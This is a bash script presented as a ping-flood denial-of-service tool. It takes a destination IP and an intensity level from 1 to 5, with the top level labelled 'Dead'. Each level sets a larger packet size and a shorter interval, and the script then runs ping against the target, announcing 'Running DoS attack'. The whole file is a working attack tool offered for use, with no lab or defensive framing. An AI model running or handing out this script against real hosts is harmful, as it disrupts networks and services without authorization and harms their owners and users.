#!/bin/bash

# Function to display usage
usage() {
  echo "Usage: $0 <Destination IP> -level <Level (1-5)>"
  echo "Levels: 1 = Low, 2 = Medium, 3 = High, 4 = VeryHigh, 5 = Dead"
  exit 1
}

# Check if a destination IP is provided
if [ -z "$1" ] || [ -z "$2" ] || [ "$2" != "-level" ]; then
  usage
fi

# Set the destination IP and level
DESTINATION=$1
LEVEL=$3

# Validate the level
if [ -z "$LEVEL" ] || ! [[ "$LEVEL" =~ ^[1-5]$ ]]; then
  echo "Level must be a number between 1 and 5."
  usage
fi

# Configure parameters based on the selected level
case $LEVEL in
  1)
    PACKET_SIZE=4096
    INTERVAL=0.01
    ;;
  2)
    PACKET_SIZE=8192
    INTERVAL=0.005
    ;;
  3)
    PACKET_SIZE=16384
    INTERVAL=0.002
    ;;
  4)
    PACKET_SIZE=32768
    INTERVAL=0.001
    ;;
  5)
    PACKET_SIZE=65500
    INTERVAL=0.0005
    ;;
  *)
    echo "Invalid level."
    usage
    ;;
esac

# Execute the DoS attack with ping
echo "Running DoS attack at level $LEVEL: Sending pings with packet size $PACKET_SIZE and an interval of $INTERVAL seconds."
ping -s $PACKET_SIZE -i $INTERVAL $DESTINATION
